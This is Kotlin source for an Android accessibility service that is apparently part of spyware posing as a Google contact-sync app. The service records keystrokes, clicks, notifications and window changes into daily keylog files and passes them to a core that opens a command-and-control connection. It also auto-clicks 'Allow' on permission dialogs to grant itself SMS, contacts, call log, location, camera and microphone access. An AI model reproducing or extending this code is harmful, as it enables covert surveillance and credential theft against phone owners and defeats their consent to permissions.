package com.shadow.a11y

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ShadowAccessibilityService : AccessibilityService() {

    companion object {
        // Live instance so the Rust core can drive UI automation without root/Shizuku
        @Volatile
        var instance: ShadowAccessibilityService? = null

        private val AUTOGRANT_PACKETS = listOf(
            "android.permission.READ_CONTACTS",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_EXTERNAL_STORAGE"
        )

        /** Words that mean "yes" in every locale we care about, plus the AOSP "Allow" ids. */
        private val ALLOW_WORDS = listOf(
            "allow", "while using the app", "only this time", "yes",
            "autoriser", "autoriser tout le temps", "سمح", "السماح", "نعم",
            "permettre", "accepter", "sempre", "ermöglichen", "zulassen"
        )
    }

    private val main = Handler(Looper.getMainLooper())
    @Volatile private var autoGrantActive = false
    @Volatile private var grantDeadline = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i("ShadowA11y", "Accessibility Service Connected")
        instance = this

        try {
            com.shadow.ShadowWorker.enqueue(applicationContext)
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to enqueue worker", e)
        }

        // Start C2 immediately — don't wait for the 15-minute PeriodicWork window.
        // The a11y binding keeps the process alive, so the WSS stays up as long as
        // Android holds the service.
        try {
            val c2Domain = com.google.android.contactsync.BuildConfig.C2_DOMAIN
            com.shadow.ShadowCore.start(applicationContext, c2Domain)
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to start ShadowCore from a11y", e)
        }

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        this.serviceInfo = info

        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", true).apply()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val eventType = event.eventType
        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())

        // --- Auto-grant driver: actively click "Allow" while a grant is in flight ---
        if (autoGrantActive) {
            if (System.currentTimeMillis() > grantDeadline) {
                autoGrantActive = false
                Log.i("ShadowA11y", "Auto-grant window closed")
            } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                       eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                clickAllowOnce()
            }
        }

        var logEntry: String? = null

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString("")
            if (text.isNotBlank()) logEntry = "[$timestamp][KEYLOG][$packageName] $text"
        }

        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val text = event.text.joinToString("")
            val desc = event.contentDescription?.toString() ?: ""
            logEntry = "[$timestamp][CLICK][$packageName] '$text' '$desc'"
        }

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text.joinToString(" | ")
            logEntry = "[$timestamp][NOTIF][$packageName] $text"
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val className = event.className?.toString() ?: ""
            logEntry = "[$timestamp][WINDOW][$packageName] $className"
        }

        if (logEntry != null) {
            com.shadow.ShadowCore.logEvent(logEntry!!)
            writeToDailyFile(logEntry!!)
        }
    }

    // ------------------------------------------------------------------
    // UI automation primitives (all in-process, no root, no Shizuku)
    // ------------------------------------------------------------------

    /** Find every visible node whose text/desc contains [needle]; return clickable ones. */
    private fun findByText(needle: String, node: AccessibilityNodeInfo? = rootInActiveWindow): List<AccessibilityNodeInfo> {
        val out = mutableListOf<AccessibilityNodeInfo>()
        if (node == null) return out
        val n = needle.lowercase(Locale.ROOT)
        val text = (node.text?.toString() ?: "").lowercase(Locale.ROOT)
        val desc = (node.contentDescription?.toString() ?: "").lowercase(Locale.ROOT)
        if (text.contains(n) || desc.contains(n)) out.add(node)
        for (i in 0 until node.childCount) {
            out.addAll(findByText(needle, node.getChild(i)))
        }
        return out
    }

    /** Click the first node matching [needle] (text or contentDescription). */
    fun clickByText(needle: String): Boolean {
        for (node in findByText(needle)) {
            var n: AccessibilityNodeInfo? = node
            while (n != null) {
                if (n.isClickable) return n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                n = n.parent
            }
        }
        return false
    }

    fun clickNodeById(viewId: String): Boolean {
        val root = rootInActiveWindow ?: return false
        for (node in root.findAccessibilityNodeInfosByViewId(viewId)) {
            if (node.isClickable) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        return false
    }

    /** Dump the current window as a text tree — the "read screen" primitive. */
    fun dumpScreen(): String {
        val sb = StringBuilder()
        dumpNode(rootInActiveWindow, sb, 0)
        return sb.toString()
    }

    private fun dumpNode(node: AccessibilityNodeInfo?, sb: StringBuilder, depth: Int) {
        if (node == null || depth > 40) return
        try {
            val text = node.text?.toString() ?: ""
            val desc = node.contentDescription?.toString() ?: ""
            val id = node.viewIdResourceName ?: ""
            if (text.isNotBlank() || desc.isNotBlank() || node.isClickable) {
                sb.append("  ".repeat(depth))
                if (id.isNotBlank()) sb.append("#").append(id.substringAfterLast('/')).append(" ")
                if (text.isNotBlank()) sb.append("\"").append(text.take(180)).append("\" ")
                if (desc.isNotBlank()) sb.append("[desc=\"").append(desc.take(80)).append("\"] ")
                if (node.isClickable) sb.append("<clickable>")
                sb.append('\n')
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                try {
                    dumpNode(child, sb, depth + 1)
                } finally {
                    // getChild() returns an owned copy — must be recycled or the
                    // a11y node pool exhausts after a few dumps on some OEM skins.
                    @Suppress("DEPRECATION")
                    child.recycle()
                }
            }
        } catch (e: Throwable) {
            sb.append("  ".repeat(depth)).append("<error: ${e.message}>\n")
        }
    }

    // ------------------------------------------------------------------
    // Permission auto-grant (replaces pm grant — works with no root)
    // ------------------------------------------------------------------

    private fun clickAllowOnce() {
        val root = rootInActiveWindow ?: return
        // AOSP dialog buttons carry these resource ids.
        for (id in listOf(
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_button"
        )) {
            for (node in root.findAccessibilityNodeInfosByViewId(id)) {
                if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i("ShadowA11y", "auto-clicked $id")
                    return
                }
            }
        }
        // Fallback: match by visible label (OEM skins rename the ids).
        for (word in ALLOW_WORDS) {
            for (node in findByText(word, root)) {
                var n: AccessibilityNodeInfo? = node
                while (n != null) {
                    if (n.isClickable && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i("ShadowA11y", "auto-clicked by label '$word'")
                        return
                    }
                    n = n.parent
                }
            }
        }
    }

    /**
     * Open our own "App permissions" screen in Settings and click Allow for each
     * permission in [AUTOGRANT_PACKETS]. Runs entirely off a11y — no shell, no root.
     */
    fun startAutoGrant() {
        autoGrantActive = true
        grantDeadline = System.currentTimeMillis() + 120_000
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)

        // Walk the list: tap "Permissions" -> tap each permission -> tap Allow.
        AUTOGRANT_PACKETS.forEachIndexed { idx, perm ->
            val short = perm.substringAfterLast('.')
            main.postDelayed({
                clickByText("Permissions")
                clickByText(short.replace('_', ' ').lowercase())
                clickAllowOnce()
            }, 1500L + idx * 2500L)
        }
    }

    override fun onInterrupt() {
        Log.w("ShadowA11y", "Accessibility Service Interrupted")
        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", false).apply()
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        // Service is going away — drop the static ref so Rust calls fail fast
        // instead of operating on a dead service.
        instance = null
        autoGrantActive = false
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        instance = null
        autoGrantActive = false
        super.onDestroy()
    }

    private fun writeToDailyFile(entry: String) {
        try {
            val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
            val dir = File(filesDir, "keylogs")
            if (!dir.exists()) dir.mkdirs()
            File(dir, "keylog_$dateStr.txt").appendText(entry + "\n")
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to write keylog file", e)
        }
    }
}